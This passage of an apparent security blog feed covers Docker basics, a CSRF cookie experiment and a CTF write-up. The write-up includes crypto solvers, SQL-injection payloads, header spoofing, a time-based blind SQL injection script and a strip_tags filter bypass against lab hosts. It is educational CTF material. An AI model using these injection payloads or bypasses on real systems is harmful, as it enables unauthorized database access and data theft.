      <category term="防火墙" scheme="http://Err0rzz.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>docker基本操作</title>
    <link href="http://Err0rzz.github.io/2017/12/20/docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>http://Err0rzz.github.io/2017/12/20/docker基本操作/</id>
    <published>2017-12-20T09:13:13.000Z</published>
    <updated>2017-12-20T10:07:02.487Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间一直在耍docker，为了防止遗忘还是记录一下这些基本命令吧。</p><a id="more"></a><p><strong>查找镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker search web</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/RnTbdGU.png" alt=""><br><br><br><strong>下载镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull php</div></pre></td></tr></table></figure></p><p><br><br><strong>上传镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker push err0r/web</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/sEUoEYz.png" alt=""><br>上传镜像前需要先登录仓库，我这里用的是默认仓库–dockerhub，然后需要打个tag<br><br><br><strong>查看本地镜像：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker images</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Yu9btFi.png" alt=""><br><br><br><strong>启动docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</div></pre></td></tr></table></figure></p><p>OPTIONS说明：</p><pre><code>-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；-d: 后台运行容器，并返回容器ID；-i: 以交互模式运行容器，通常与 -t 同时使用；-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；--name=&quot;nginx-lb&quot;: 为容器指定一个名称；--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；-h &quot;mars&quot;: 指定容器的hostname；-e username=&quot;ritchie&quot;: 设置环境变量；--env-file=[]: 从指定文件读入环境变量；--cpuset=&quot;0-2&quot; or --cpuset=&quot;0,1,2&quot;: 绑定容器到指定CPU运行；-m :设置容器使用内存最大值；--net=&quot;bridge&quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；--link=[]: 添加链接到另一个容器；--expose=[]: 开放一个端口或一组端口； </code></pre><p>虽然这么多参数，但是我基本上只有<code>-it</code>来启动交互式<code>bash</code>，用<code>-p hostport:dockerport</code>来开启端口映射，<code>--name</code>来指定容器名称<br><img src="https://i.imgur.com/mZJCJnn.png" alt=""><br>image的话，会先搜索本地的image有没有，如果没有的话，再去仓库找。<br><br><br><strong>查看正在运行的docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker ps</div></pre></td></tr></table></figure></p><p>后面的话暂时只用过<code>-a</code>来列出所有docker(包括停止了的docker)，<code>-l</code>来查看最新创建的docker，<code>-q</code>只列出docker的id<br><br><br><strong>退出docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ctrl+p+q || exit</div></pre></td></tr></table></figure></p><p>安全退出docker，docker仍然在后台运行而不是关闭<br><br><br><strong>重新进入docker：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker exec -it 9d /bin/bash</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/FOjuRQP.png" alt=""><br>值得一提的是，在docker命令中不一定要把id全部都打出来，只要打出能识别唯一的docker的部分就好了，比如9d，电脑就能找到这个docker就ok了。<br><br><br><strong>docker重新变成image：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker commit 9d test</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/5ubzbqQ.png" alt=""><br>先接docker，再接生成的image的名字<br><br><br><strong>docker停止：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker stop 9d</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ekjYWjv.png" alt=""><br>值得一提的是，不管之后删image还是删docker，都需要先停止全部相关的docker才能删除成功。<br><br><br><strong>docker删除：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker rm 9d</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/UgMplxZ.png" alt=""><br>可以看到连ps -a都看不到这个9d的容器了。<br>这里有个骚操作，如果要想批量启动停止或者删除docker，可以用以下的命令,不过有一点，删除一定要记得先停止。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker start $(docker ps -a -q)</div><div class="line">docker stop $(docker ps -a -q)</div><div class="line">docker rm $(docker ps -a -q)</div></pre></td></tr></table></figure></p><p><br><br><strong>镜像删除</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker rmi test</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/8FGvOfl.png" alt=""><br><br></p><p>就先这些吧，以后碰到需要记得再记吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间一直在耍docker，为了防止遗忘还是记录一下这些基本命令吧。&lt;/p&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://Err0rzz.github.io/tags/docker/"/>
    
      <category term="基础命令" scheme="http://Err0rzz.github.io/tags/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>CSRF学习</title>
    <link href="http://Err0rzz.github.io/2017/12/15/CSRF%E5%AD%A6%E4%B9%A0/"/>
    <id>http://Err0rzz.github.io/2017/12/15/CSRF学习/</id>
    <published>2017-12-15T06:05:12.000Z</published>
    <updated>2017-12-15T11:05:44.791Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看道哥的《白帽子讲web安全》(大学买的第一本书)，觉得物超所值啊~把书上的一些简单的实验给复现一下，记录一下。</p><a id="more"></a><h2 id="浏览器的cookie策略"><a href="#浏览器的cookie策略" class="headerlink" title="浏览器的cookie策略"></a>浏览器的cookie策略</h2><p>浏览器的cookie分两种：一种是“<strong>Session Cookie</strong>”，又称“临时Cookie”；另一种是“<strong>Third-party Cookie</strong>”，也称为“本地Cookie”。</p><p>两者的区别在于，<strong>Third-party Cookie</strong>是服务器在<code>Set-Cookie</code>是指定了<code>Expire</code>时间，只有到了时间后Cookie才会失效，所以这种Cookie会保存在本地；而<strong>Session Cookie</strong>则没有指定<code>Expire</code>时间，所以浏览器关闭后，<strong>Session Cookie</strong>就失效了。</p><p>例如在<code>http://67.209.184.30/a.php</code>中，会给浏览器写入两个Cookie：一个是<strong>Session Cookie</strong>，另一个为<strong>Third-party Cookie</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&apos;set-cookie: cookie1=test1;&apos;);</div><div class="line">header(&apos;set-cookie: cookie2=test2;expires=Thu,01-jan-2030 00:00:01 GMT;&apos;,false);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>访问该页面，发现浏览器接受了两个Cookie。<br><img src="https://i.imgur.com/KaIej1a.png" alt=""><br><img src="https://i.imgur.com/3nmFqTW.png" alt=""></p><p>此时在另外一个域中，有一个页面<code>http://127.0.0.1/index.html</code>，此页面构造了CSRF以访问<code>67.209.184.30</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://67.209.184.30/&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure></p><p>此时如果是IE，会默认禁止浏览器在<img>、<iframe>、<script>、<link>等标签中发送第三方Cookie，也就是说只能发送出<strong>Session Cookie</strong>，而<strong>Third-party Cookie</strong>被禁止。</p><p>但是因为我是用的Firefox，所以默认策略是允许发送第三方Cookie的<br><img src="https://i.imgur.com/r4BaRvl.png" alt=""></p><h2 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h2><p>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。在IE下即使是<iframe>、<script>等标签也将不再拦截第三方Cookie的发送。</p><p>假设127.0.0.1/index.html的内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p></script></iframe></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看道哥的《白帽子讲web安全》(大学买的第一本书)，觉得物超所值啊~把书上的一些简单的实验给复现一下，记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="《白帽子讲web安全》" scheme="http://Err0rzz.github.io/tags/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B/"/>
    
      <category term="书籍学习" scheme="http://Err0rzz.github.io/tags/%E4%B9%A6%E7%B1%8D%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>第一届智商杯wp</title>
    <link href="http://Err0rzz.github.io/2017/12/11/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%99%BA%E5%95%86%E6%9D%AFwp/"/>
    <id>http://Err0rzz.github.io/2017/12/11/第一届智商杯wp/</id>
    <published>2017-12-11T07:54:09.000Z</published>
    <updated>2017-12-13T07:47:02.876Z</updated>
    
    <content type="html"><![CDATA[<p>周末出题老表伤透了心，原本高高兴兴的打算直接用做出来的童鞋的wp，结果发现没人做，还是得自己写…</p><a id="more"></a><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>这次的密码题都是偏向简单的题目<br><br></p><h2 id="女神的短信"><a href="#女神的短信" class="headerlink" title="女神的短信"></a>女神的短信</h2><p>提示短信，手机键盘九宫格加密，前面那个数字表示第几个按钮，后面那个数字表示那个按钮第几个(没想到最后变成了真正的签到题，看着动态积分从1000变到20，emmmmm所有队伍都做出来了)。<br><br></p><h2 id="签到题–RSA"><a href="#签到题–RSA" class="headerlink" title="签到题–RSA"></a>签到题–RSA</h2><p>最基本的rsa解密，直接贴py代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import gmpy2</div><div class="line">p = 3487583947589437589237958723892346254777 </div><div class="line">q = 8767867843568934765983476584376578389</div><div class="line">c = 4058547387436141457047422472489672162421145320474233882240312859636305303864</div><div class="line">e = 65537</div><div class="line">inv_n = (p-1)*(q-1)</div><div class="line">d = gmpy2.invert(e,inv_n)</div><div class="line">m = pow(c,d,p*q)</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/XhkYEyz.png" alt=""><br><br></p><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p>上课也讲过的共模攻击，最让老表伤心的是没有一个人去看老表的上课用的课件<a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/" title="RSA套路">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/</a><br>还是直接贴代码吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">c1=0x1cbd53af140710b23864f60e8d0741951b89bd03ce4d73573b0e8bb4d33b36a624e645312613b06759cfa9c4fa00bf8d4781a8e89aL</div><div class="line">c2=0x5a87c76d2d79694e75ad2911c44d8208a7447852f26b37480dbc9d376579add2bed957db9b76fd16c60cccbbc9e901dddfe9a1eb3L</div><div class="line">n=6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</div><div class="line">e1=839</div><div class="line">e2=773</div><div class="line"></div><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">      return (b, 0, 1)</div><div class="line">    else:</div><div class="line">      g, y, x = egcd(b % a, a)</div><div class="line">      return (g, x - (b // a) * y, y)</div><div class="line">def modinv(a, m):</div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    if g != 1:</div><div class="line">      raise Exception(&apos;modular inverse does not exist&apos;)</div><div class="line">    else:</div><div class="line">      return x % m</div><div class="line"></div><div class="line">s = egcd(e1, e2)</div><div class="line">s1 = s[1]</div><div class="line">s2 = s[2]</div><div class="line"></div><div class="line">if s1&lt;0:</div><div class="line">   s1 = - s1</div><div class="line">   c1 = modinv(c1, n)</div><div class="line">elif s2&lt;0:</div><div class="line">   s2 = - s2</div><div class="line">   c2 = modinv(c2, n)</div><div class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ANlX3hp.png" alt=""><br><br></p><h2 id="有意思的解密"><a href="#有意思的解密" class="headerlink" title="有意思的解密"></a>有意思的解密</h2><p>下载zip里面有两个文件，key.txt是一串十六进制，转化一下得到key=<code>&#39;i_think_zz_is_ok&#39;</code>，然后flag.py文件是rc4的加密函数，对着加密函数逆推一个解密函数即可(有童鞋百度出解密函数也算是不预期解吧，其实耐心推一下也很快的)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">import random</div><div class="line">import base64</div><div class="line">from hashlib import sha1</div><div class="line">strCipher = &apos;dOo0foiNBuQvKQ1oEdPiLawHQHtwYoGZu6CsmQwM4MD9Rkz0VVMzJTcz0/EDmHAwhgg16VA0MulkmKYnzNnFk9cwJAG6FQ==&apos;</div><div class="line">key = &apos;i_think_zz_is_ok&apos;</div><div class="line"></div><div class="line">def crypt(data, key):</div><div class="line">    x = 0</div><div class="line">    box = range(256)</div><div class="line">    for i in range(256):</div><div class="line">        x = (x + box[i] + ord(key[i % len(key)])) % 256</div><div class="line">        box[i], box[x] = box[x], box[i]</div><div class="line"></div><div class="line">    x = y = 0</div><div class="line">    out = []</div><div class="line">    for char in data:</div><div class="line">        x = (x + 1) % 256</div><div class="line">        y = (y + box[x]) % 256</div><div class="line">        box[x], box[y] = box[y], box[x]</div><div class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</div><div class="line"></div><div class="line">    return &apos;&apos;.join(out)</div><div class="line"></div><div class="line">def decrypt(data, key):</div><div class="line">    x = 0</div><div class="line">    box = range(256)</div><div class="line">    for i in range(256):</div><div class="line">        x = (x + box[i] + ord(key[i % len(key)])) % 256</div><div class="line">        box[i], box[x] = box[x], box[i]</div><div class="line">    x = y = 0</div><div class="line">    data1=[]</div><div class="line">    for char in data:</div><div class="line">        x=(x+1)%256</div><div class="line">        y=(y+box[x])%256</div><div class="line">        box[x],box[y] = box[y], box[x]</div><div class="line">        data1.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</div><div class="line">    return &apos;&apos;.join(data1)</div><div class="line"></div><div class="line">  </div><div class="line">def encode(data, key, encode=base64.b64encode, salt_length=16):</div><div class="line">    salt = &apos;&apos;</div><div class="line">    for n in range(salt_length):</div><div class="line">        salt += chr(random.randrange(256))</div><div class="line">    #salt=&apos;11&apos;</div><div class="line">    data = salt + crypt(data, sha1(key + salt).digest())</div><div class="line">    if encode:</div><div class="line">        data = encode(data)</div><div class="line">    return data</div><div class="line"></div><div class="line">def decode(data, key, decode=base64.b64decode, salt_length=16):</div><div class="line">    salt = &apos;&apos;</div><div class="line">    if decode:</div><div class="line">        data=decode(data)</div><div class="line">    for n in range(salt_length):</div><div class="line">        salt += chr(random.randrange(256))</div><div class="line">    #salt=&apos;11&apos;</div><div class="line">    salt=data[:16]</div><div class="line">    out=data[16:]</div><div class="line">    return decrypt(out,sha1(key + salt).digest())</div><div class="line">    </div><div class="line">print decode(strCipher,key)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/hC3Mn2F.png" alt=""><br><br></p><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>这题讲道理比上一题要简单，但是因为上一题网上有rc4的解密代码，所以做出来的人比这题多…<br>原题目，flag.py:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">from hashlib import sha256</div><div class="line"></div><div class="line">key = &apos;zjgsctf&apos;</div><div class="line">cipher = &apos;112a9166aebc5e677573f365d8b38c72&apos;</div><div class="line"></div><div class="line">def xor(a,b):</div><div class="line">    return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])</div><div class="line">def HASH(data):</div><div class="line">    return sha256(data).digest()[:8]</div><div class="line"></div><div class="line">def bes_encrypt(subkeys, data):</div><div class="line">    i = 0</div><div class="line">    d1 = data[:8]</div><div class="line">    d2 = data[8:]  </div><div class="line">    for i in subkeys:</div><div class="line">       d1 = xor(xor(HASH(d2),i),d1)  </div><div class="line">       d1,d2 = d2,d1</div><div class="line">    return d2 + d1</div><div class="line"></div><div class="line">def key_schedule(key):</div><div class="line">    subKeys = []</div><div class="line">    subKey = key</div><div class="line">    for i in xrange(16):</div><div class="line">        subKey = HASH(subKey)</div><div class="line">        subKeys.append(subKey)</div><div class="line">    return subKeys</div><div class="line"></div><div class="line">def bes(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p>观察代码可以发现，对key的操作变换并没有涉及随机数，所以加密用的subkeys和解密用的subkeys是一样的。然后就可以对着bes_encrypt的代码逆着写一份bes_decrypt出来，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">from hashlib import sha256</div><div class="line"></div><div class="line">def xor(a,b):</div><div class="line">    return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])</div><div class="line"></div><div class="line">def HASH(data):</div><div class="line">    return sha256(data).digest()[:8]</div><div class="line"></div><div class="line">def bes_encrypt(subkeys, data):</div><div class="line">    i = 0</div><div class="line">    d1 = data[:8]</div><div class="line">    d2 = data[8:]  </div><div class="line"></div><div class="line">    print d2.encode(&apos;hex&apos;)  </div><div class="line">    for i in subkeys:</div><div class="line">       d1 = xor(xor(HASH(d2),i),d1)  </div><div class="line">       d1,d2 = d2,d1</div><div class="line"></div><div class="line">    return d2 + d1</div><div class="line"></div><div class="line"></div><div class="line">def bes_decrypt(subkeys,data):</div><div class="line">    data = data.decode(&apos;hex&apos;)</div><div class="line">    d2 = data[:8]</div><div class="line">    d1 = data[8:]</div><div class="line"></div><div class="line">    subkeys=subkeys[::-1]</div><div class="line">    for i in subkeys:</div><div class="line">        d1,d2=d2,d1</div><div class="line">        d1 = xor(xor(HASH(d2),i),d1)</div><div class="line"></div><div class="line">    return d1+d2</div><div class="line"></div><div class="line">def key_schedule(key):</div><div class="line">    subKeys = []</div><div class="line">    subKey = key</div><div class="line">    for i in xrange(16):</div><div class="line">        subKey = HASH(subKey)</div><div class="line">        subKeys.append(subKey)</div><div class="line">    return subKeys</div><div class="line"></div><div class="line">def bes(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">def besdd(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_decrypt(subKeys, data)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    key = &apos;zjgsctf&apos;</div><div class="line">    cipher = &apos;112a9166aebc5e677573f365d8b38c72&apos;</div><div class="line">    print besdd(key,cipher)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/E0a2xXd.png" alt=""><br><br></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>我原以为…算了，想想某涛的pwn一题都没被做出来，我心里还是有点安慰的。<br><br></p><h2 id="签到题–sql1"><a href="#签到题–sql1" class="headerlink" title="签到题–sql1"></a>签到题–sql1</h2><p>右键源码可以看到php源码<img src="https://i.imgur.com/fPKUvkB.png" alt=""><br>对输入的两个参数都没加任何过滤，而且只需要sql查询有结果即可返回flag，最简单的payload就是<strong>username=’ or 1=1#&amp;password=</strong><br><img src="https://i.imgur.com/dOnk02n.png" alt=""><br><br></p><h2 id="又一个签到题"><a href="#又一个签到题" class="headerlink" title="又一个签到题"></a>又一个签到题</h2><p>我一开始以为这种题目大家应该都做吐了的，所以又是送分题…后来发现并不是这样…<br>一开始说<strong>Only localhost can get flag!</strong>，那修改一下http请求头里的<code>x-forwarded-for</code>为<code>127.0.0.1</code>，然后发现变成了<strong>Only Chinese can get flag!</strong>，那修改一下语言，将<code>Accept-Language</code>中的<code>en-US</code>    去掉，得到flag<img src="https://i.imgur.com/zUGfqqc.png" alt=""><br><br></p><h2 id="Lazy壮壮–sql2"><a href="#Lazy壮壮–sql2" class="headerlink" title="Lazy壮壮–sql2"></a>Lazy壮壮–sql2</h2><p>测试一下会发现没有回显，猜测是时间盲注。然后试了试<code>sleep</code>方法，会发现被过滤了，而且这个题目只过滤了<code>sleep</code>。那么咋们就换一个函数好了，换成<code>benchmark</code>，其他的还是原来的配方，写个盲注脚本就好了(这里我先在本地试了下<code>benchmark(20000000,md5(&#39;test&#39;))</code>大概需要7秒多，你们也可以自行更改参数来调整)。这里友情提示一下，你们可以把这些脚本收集一下，以后可以直接修改脚本，做题效率会高很多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import time</div><div class="line">url = &apos;http://10.21.13.152:20001/check.php&apos;</div><div class="line">payloads=&apos;1234567890qwertyuiopasdfghjklzxcvbnm_@QWERTYUIOPASDFGHJKLZXCVBNM,*&apos;</div><div class="line"></div><div class="line">def exp(i,x):</div><div class="line">    #sql2.users233.p4sswo3d</div><div class="line">    #xx = &quot;&apos; or if(substring((select database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line">    #xx = &quot;&apos; or if(substring((select group_concat(table_name) from information_schema.columns where table_schema=database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line">    #xx = &quot;&apos; or if(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users233&apos;)  from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line">    xx = &quot;&apos; or if(substring((select group_concat(p4sswo3d) from users233) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line"></div><div class="line">    data=&#123;&apos;id&apos;:xx %(i,x)&#125;</div><div class="line">    first_time=time.time()</div><div class="line">    response = requests.post(url,data = data)</div><div class="line">    next_time=time.time()</div><div class="line">    if (next_time-first_time) &gt; 2:</div><div class="line">        return 1</div><div class="line">    else :</div><div class="line">        return 0</div><div class="line"></div><div class="line">ans=&apos;&apos;</div><div class="line">print &apos;star&apos;</div><div class="line">for i in range(1,100):</div><div class="line">    for x in payloads:</div><div class="line">        if exp(i,x)==1:</div><div class="line">            ans+=x</div><div class="line">            print ans</div><div class="line">            break</div><div class="line">    if x==&apos;*&apos;:</div><div class="line">        print &quot;over&quot;</div><div class="line">        break</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/N15K7ST.png" alt=""><br>解出来两个md5值，去cmd5解一下，一个是’no’，另一个是’hacker’。提交hacker即可。</p><h2 id="其实很简单–sql3"><a href="#其实很简单–sql3" class="headerlink" title="其实很简单–sql3"></a>其实很简单–sql3</h2><p>右键源码可以看到提示说需要<code>?id</code>，或者遇到这种什么都没有的题目的思路一般都是源码泄露(我题目也说了’壮壮好像泄露了什么…’)，这里是<code>.index.php.swp</code>文件泄露，下载下来之后用<code>vim -r</code>打开即可恢复源码。<br>观察源码，会发现是数字型注入，而且过滤了很多函数。但是同时也发现有个不起眼但是很“多余”的函数<code>strip_tags</code>，这个函数拿去百度一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</div></pre></td></tr></table></figure></p><p>这样一切的过滤都可以轻松绕过了，只需要将<code>select</code>改成<code>sele&lt;br&gt;ct</code>这样，即在中间加上html标签即可，如下测试：<br><img src="https://i.imgur.com/uS3Mlmx.png" alt=""></p><p>接下来就是最基本的sql注入了，就不多啰嗦了，直接贴payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">列数：http://10.21.13.152:20002/?id=1 o&lt;br&gt;rder b&lt;br&gt;y 3</div><div class="line">库名：http://10.21.13.152:20002/?id=-1 